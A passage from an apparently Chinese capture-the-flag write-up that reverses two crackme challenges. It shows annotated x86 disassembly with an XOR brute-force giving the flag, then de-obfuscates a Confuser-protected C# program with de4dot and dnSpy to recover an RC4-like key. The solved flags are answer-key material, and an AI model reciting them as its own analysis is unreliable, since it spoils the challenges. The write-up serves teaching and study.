<span class="keyword">sub</span>     <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001297</span>                 <span class="keyword">mov</span>     [<span class="built_in">rdx</span>-<span class="number">1</span>], <span class="built_in">sil</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001294</span>                 <span class="keyword">mov</span>     [<span class="built_in">rax</span>+<span class="number">1</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001291</span>                 <span class="keyword">cmp</span>     <span class="built_in">rdx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000128F                 <span class="keyword">jb</span>      short loc_12B0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001288</span>                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">cs</span>:byte_4080</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001286</span>                 <span class="keyword">test</span>    <span class="built_in">cl</span>, <span class="built_in">cl</span> <span class="comment">;检测变换完成后的字符串是否为空</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001286</span> loc_1286:                               <span class="comment">; CODE XREF: .text:0000000000001110↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001286</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001284</span>                 <span class="keyword">jz</span>      short loc_125F <span class="comment">;为空则跳转</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000127D</span>                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, byte_4080</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000127D</span> loc_127D:                               <span class="comment">; CODE XREF: .text:000000000000125D↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000127D</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000127D</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000127B                 <span class="keyword">jmp</span>     short loc_126E</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001278</span>                 <span class="keyword">mov</span>     [<span class="built_in">rax</span>], <span class="built_in">dx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001274</span>                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">2</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001270</span>                 <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000126E                 <span class="keyword">test</span>    <span class="built_in">cl</span>, <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000126E loc_126E:                               <span class="comment">; CODE XREF: .text:000000000000127B↓j</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000126E</span><br><span class="line"><span class="symbol">.text:</span>000000000000126C                 <span class="keyword">jz</span>      short loc_125F</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001268</span>                 <span class="keyword">movzx</span>   <span class="built_in">esi</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001264</span>                 <span class="keyword">movzx</span>   <span class="built_in">edx</span>, <span class="built_in">sil</span> <span class="comment">;将输入的字符串字节两两组合成为一个word</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001262</span>                 <span class="keyword">mov</span>     <span class="number">dh</span>, <span class="built_in">cl</span> <span class="comment">;比如倒序后是654321，这里就变成56 34 12</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000125F                 <span class="keyword">test</span>    <span class="built_in">sil</span>, <span class="built_in">sil</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000125F                                         <span class="comment">; .text:0000000000001284↓j ...</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000125F loc_125F:                               <span class="comment">; CODE XREF: .text:000000000000126C↓j</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000125F</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000125D</span>                 <span class="keyword">jnz</span>     short loc_127D</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001255</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2170 <span class="comment">;加载0~255的ASCII字符集</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001252</span>                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000124F                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000124B                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001243</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2180</span><br><span class="line"><span class="symbol">.text:</span>000000000000123E                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">10h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001236</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2190</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001231</span>                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">20h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001229</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_21A0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001224</span>                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">30h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000121C                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_21B0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001217</span>                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">40h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000120F                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_21C0</span><br><span class="line"><span class="symbol">.text:</span>000000000000120A                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">50h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001202</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_21D0</span><br><span class="line"><span class="symbol">.text:</span>00000000000011FD                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">60h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011F5                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_21E0</span><br><span class="line"><span class="symbol">.text:</span>00000000000011F0                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">70h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011E8                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_21F0</span><br><span class="line"><span class="symbol">.text:</span>00000000000011E0                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">80h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011D8                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2200</span><br><span class="line"><span class="symbol">.text:</span>00000000000011D0                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">90h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011C8                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2210</span><br><span class="line"><span class="symbol">.text:</span>00000000000011C0                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">0A0h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011B8                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2220</span><br><span class="line"><span class="symbol">.text:</span>00000000000011B0                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">0B0h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011A8                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2230</span><br><span class="line"><span class="symbol">.text:</span>00000000000011A0                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">0C0h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001198</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2240</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001190</span>                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">0D0h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001188</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2250</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001180</span>                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">0E0h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001178</span>                 <span class="keyword">movdqa</span>  <span class="built_in">xmm0</span>, <span class="built_in">cs</span>:xmmword_2260</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001170</span>                 <span class="keyword">movaps</span>  xmmword <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">0F0h</span>], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000116B                 <span class="keyword">call</span>    loc_188E <span class="comment">;关键加密函数loc_188E</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001164</span>                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, unk_4040</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001160</span>                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rdx</span>+<span class="number">18h</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000115D</span>                 <span class="keyword">test</span>    <span class="built_in">rax</span>, <span class="built_in">rax</span> </span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000115D</span>                                         <span class="comment">; .text:00000000000012D2↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000115D</span> loc_115D:                               <span class="comment">; CODE XREF: .text:000000000000112C↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000115D</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000115B                 <span class="keyword">jnz</span>     short loc_1137</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001154</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aWrong     <span class="comment">; &quot;Wrong!&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001152</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001152</span> loc_1152:                               <span class="comment">; CODE XREF: .text:000000000000111C↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001152</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000114D</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001146</span>                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001144</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001143</span>                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001143</span> loc_1143:                               <span class="comment">; CODE XREF: .text:loc_112E↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001143</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001143</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001142</span>                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000113E                 <span class="keyword">add</span>     <span class="built_in">rdx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000113A                 <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001137</span>                 <span class="keyword">cmp</span>     <span class="built_in">rdx</span>, <span class="built_in">rcx</span> <span class="comment">;循环比较加密的flag与密文（unk_4040）</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001137</span> loc_1137:                               <span class="comment">; CODE XREF: .text:000000000000115B↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001137</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001135</span>                 <span class="keyword">jz</span>      short loc_112E</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001132</span>                 <span class="keyword">movzx</span>   <span class="built_in">ebx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdx</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001130</span>                 <span class="keyword">cmp</span>     [<span class="built_in">rax</span>], <span class="built_in">bl</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000112E                 <span class="keyword">jz</span>      short loc_1143</span><br><span class="line"><span class="symbol">.text:</span>000000000000112E loc_112E:                               <span class="comment">; CODE XREF: .text:0000000000001135↓j</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000112E</span><br><span class="line"><span class="symbol">.text:</span>000000000000112E <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000112C                 <span class="keyword">jmp</span>     short loc_115D</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001125</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aRight     <span class="comment">; &quot;Right!&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001123</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000111E                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span>000000000000111E loc_111E:                               <span class="comment">; CODE XREF: .text:loc_12B0↓j</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000111E</span><br><span class="line"><span class="symbol">.text:</span>000000000000111E <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000111C                 <span class="keyword">jmp</span>     short loc_1152</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001115</span>                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">cs</span>:byte_4080</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001115</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001110</span>                 <span class="keyword">jmp</span>     loc_1286</span><br></pre></td></tr></table></figure>
<p>查看关键函数loc_188E，发现函数虽然很长但是有用的操作并不多，带入的字符串分别与三个固定字节进行异或得到三个加密结果，并与密文进行比较来判断是否正确，提取密文unk_4040：<font color=lime><strong>[0x13, 0x1C, 0x17, 0x52, 0x13, 0x52, 0x52, 0x45, 0x14, 0x3E, 0x3E, 0x11, 0x45, 0x50, 0x05, 0x3E, 0x16, 0x51, 0x1A, 0x0F, 0x00, 0x06, 0x07, 0x0D]</strong></font>，直接用单字节异或爆破，得到异或值为0x61，flag为：<font color=deepskyblue><strong>flag{nw0d_$1_pu_3$r3v3r}</strong></font>.</p>
<h2 id="cccc："><a href="#cccc：" class="headerlink" title="cccc："></a>cccc：</h2><p>由于是C#程序所以并不是很好分析，动态调试后推断关键流程在所给的dll文件中，发现dll文件有confuser保护器，函数名称等全是乱码，并且还有控制流平坦化混淆，先用de4dot把乱码的名字去掉，然后用dnspy打开，找到一个关键类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000021 RID: 33</span></span><br><span class="line">[<span class="meta">Attribute2(1)</span>]</span><br><span class="line">[<span class="meta">Attribute1(0)</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Class8</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x06000097 RID: 151 RVA: 0x00008E28 File Offset: 0x00007028</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		Console.Write(&lt;Module&gt;.smethod_3&lt;<span class="built_in">string</span>&gt;(<span class="number">1048771348</span>));</span><br><span class="line">		<span class="keyword">for</span> (;;)</span><br><span class="line">		&#123;</span><br><span class="line">			IL_00B4:</span><br><span class="line">			<span class="built_in">int</span> num = <span class="number">-1556255283</span>;</span><br><span class="line">			<span class="keyword">for</span> (;;)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">switch</span> ((num ^ <span class="number">-47866585</span>) % <span class="number">6</span>)</span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">					<span class="keyword">goto</span> IL_00B4;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">					Console.WriteLine(&lt;Module&gt;.smethod_5&lt;<span class="built_in">string</span>&gt;(<span class="number">1883395676</span>)); <span class="comment">//结果输出</span></span><br><span class="line">					num = <span class="number">-1771531466</span>;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">					Console.WriteLine(&lt;Module&gt;.smethod_2&lt;<span class="built_in">string</span>&gt;(<span class="number">-2009154180</span>)); <span class="comment">//结果输出</span></span><br><span class="line">					num = <span class="number">-1025795689</span>;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">string</span> text = Console.ReadLine(); <span class="comment">//这里读取了输入的字符串</span></span><br><span class="line">					<span class="built_in">byte</span>[] array = GClass0.smethod_1&lt;<span class="built_in">byte</span>, <span class="built_in">string</span>&gt;(&lt;Module&gt;.smethod_6&lt;<span class="built_in">string</span>&gt;(<span class="number">53665066</span>), GClass0.smethod_0&lt;<span class="built_in">byte</span>, <span class="built_in">int</span>, <span class="built_in">string</span>&gt;(text)); <span class="comment">//加密</span></span><br><span class="line">					num = (Class8.smethod_0&lt;<span class="built_in">int</span>, <span class="built_in">bool</span>, <span class="built_in">byte</span>&gt;(<span class="keyword">new</span> <span class="built_in">byte</span>[] <span class="comment">//密文和比较</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="number">248</span>, <span class="number">177</span>, <span class="number">30</span>, <span class="number">232</span>, <span class="number">127</span>, <span class="number">153</span>, <span class="number">222</span>, <span class="number">78</span>, <span class="number">132</span>, <span class="number">180</span>,</span><br><span class="line">						<span class="number">21</span>, <span class="number">33</span>, <span class="number">182</span>, <span class="number">142</span>, <span class="number">209</span>, <span class="number">42</span>, <span class="number">139</span>, <span class="number">154</span>, <span class="number">77</span>, <span class="number">231</span>,</span><br><span class="line">						<span class="number">143</span>, <span class="number">218</span>, <span class="number">35</span>, <span class="number">192</span>, <span class="number">169</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">231</span>, <span class="number">2</span>, <span class="number">65</span>,</span><br><span class="line">						<span class="number">144</span>, <span class="number">136</span>, <span class="number">119</span>, <span class="number">117</span>, <span class="number">186</span>, <span class="number">50</span>, <span class="number">198</span>, <span class="number">176</span>, <span class="number">132</span>, <span class="number">36</span>,</span><br><span class="line">						<span class="number">166</span>, <span class="number">168</span>, <span class="number">69</span>, <span class="number">246</span>, <span class="number">205</span>, <span class="number">156</span>, <span class="number">138</span>, <span class="number">50</span></span><br><span class="line">					&#125;, array) ? (<span class="number">-1228472614</span>) : (<span class="number">-867456784</span>));</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">goto</span> Block_2;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Block_2:;</span><br><span class="line">	&#125;</span><br><span class="line">…</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提取密文：<font color=lime><strong>[f8 b1 1e e8 7f 99 de 4e 84 b4 15 21 b6 8e d1 2a 8b 9a 4d e7 8f da 23 c0 a9 62 63 e7 02 41 90 88 77 75 ba 32 c6 b0 84 24 a6 a8 45 f6 cd 9c 8a 32]</strong></font>，共计44字节，然后分析加密流程，可以注意到是用<code>GClass0</code>中的<code>smethod0</code>先将输入的字符串进行处理，同时用<code>Module</code>中的<code>smethod6</code>对一个整数进行处理，然后将两个的处理结果传入<code>Gclass0</code>的<code>smethod1</code>进行最后处理，输出字节数组，推测<code>Module</code>中的<code>smethod6</code>是用于生成密钥的，dnspy动态调试取得密钥：<code>doyouknowcsharp</code>，再看<code>Gclass0</code>中的<code>method</code>，注意到以下代码段：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Token: 0x06000078 RID: 120 RVA: 0x0000883C File Offset: 0x00006A3C</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> T0[] <span class="title">smethod_1</span>&lt;<span class="title">T0</span>, <span class="title">T1</span>&gt;(<span class="params">T1 gparam_0, T0[] gparam_1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> GClass0.smethod_2&lt;T0, <span class="built_in">int</span>, T1&gt;(gparam_0, gparam_1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x06000079 RID: 121 RVA: 0x00008850 File Offset: 0x00006A50</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> T0[] <span class="title">smethod_2</span>&lt;<span class="title">T0</span>, <span class="title">T1</span>, <span class="title">T2</span>&gt;(<span class="params">T2 gparam_0, T0[] gparam_1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	T0[] array = GClass0.smethod_3&lt;T0, T1&gt;(GClass0.smethod_0&lt;T0, T1, T2&gt;(gparam_0));</span><br><span class="line">	T1 t = <span class="number">0</span>;</span><br><span class="line">	T1 t2 = <span class="number">0</span>;</span><br><span class="line">	T0[] array2;</span><br><span class="line">	<span class="keyword">for</span> (;;)</span><br><span class="line">	&#123;</span><br><span class="line">		IL_0132:</span><br><span class="line">		<span class="built_in">uint</span> num = <span class="number">965942686U</span>;</span><br><span class="line">		<span class="keyword">for</span> (;;)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">uint</span> num2;</span><br><span class="line">			<span class="keyword">switch</span> ((num2 = num ^ <span class="number">1671582653U</span>) % <span class="number">10U</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1U</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				T1 t3 = <span class="number">0</span>;</span><br><span class="line">				num = (num2 * <span class="number">2964175099U</span>) ^ <span class="number">3088226582U</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2U</span>:</span><br><span class="line">				num = (num2 * <span class="number">2557159329U</span>) ^ <span class="number">3766832993U</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3U</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				T0 t4;</span><br><span class="line">				array[t2] = t4;</span><br><span class="line">				num = (num2 * <span class="number">1977227374U</span>) ^ <span class="number">428192606U</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4U</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				T1 t3;</span><br><span class="line">				num = ((t3 &gt;= gparam_1.Length) ? <span class="number">135939119U</span> : <span class="number">530945064U</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5U</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				T1 t3;</span><br><span class="line">				array2[t3] = (<span class="built_in">byte</span>)(gparam_1[t3] ^ array[(array[t] + array[t2]) % <span class="number">256</span>] ^ <span class="number">100</span>);</span><br><span class="line">				num = (num2 * <span class="number">1446099815U</span>) ^ <span class="number">1371508486U</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span 